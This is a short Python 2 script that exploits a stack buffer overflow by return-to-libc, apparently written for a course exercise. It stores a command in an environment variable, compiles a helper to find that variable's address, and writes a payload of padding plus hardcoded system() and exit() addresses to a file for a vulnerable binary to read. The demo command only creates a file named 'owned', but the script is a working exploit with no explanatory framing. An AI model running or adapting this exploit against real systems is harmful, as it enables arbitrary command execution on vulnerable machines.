# USAGE: 
# run: python2 ret2lib.py
# => this will drop you in a new shell with EGG environment variable  and create dummy file
# run: ./basic_overflow_fread dummy
# => this will create the owned file

import os
import subprocess
import struct

c_code_name = "%s.c"%("a"*20)


def compile_helper_program():
    c_code = """
#include <stdio.h>
#include <stdlib.h>
int main()
{
    printf("%x\\n", (unsigned int)getenv("EGG"));
    return 0;
}
    """
    fd = open(c_code_name, "w")
    fd.write(c_code)
    fd.close()

    os.system("gcc -o %s %s"%(c_code_name[:-2], c_code_name))
    os.system("rm %s"%(c_code_name))


# set environment variable and get address
os.environ["EGG"] =  "touch owned"
compile_helper_program()
proc = subprocess.Popen(["/home/user/aufgabe2/%s"%(c_code_name[:-2])],stdout=subprocess.PIPE)
out = proc.stdout.readline().rstrip()
print hex(int(out, 16)+0xc)
egg_addr = struct.pack("<I", int(out, 16)+0xc)
os.system("rm %s"%(c_code_name[:-2]))



# 0xb7e5a100
system_addr = "\x00\xa1\xe5\xb7"

# 0xb7e4d150
exit_addr = "\x50\xd1\xe4\xb7"

trash = "a"*120
payload = trash + system_addr + exit_addr + egg_addr

# write exploit file
fd = open("dummy", "w")
fd.write(payload)
fd.close()

# drop to shell
os.system("/bin/bash")
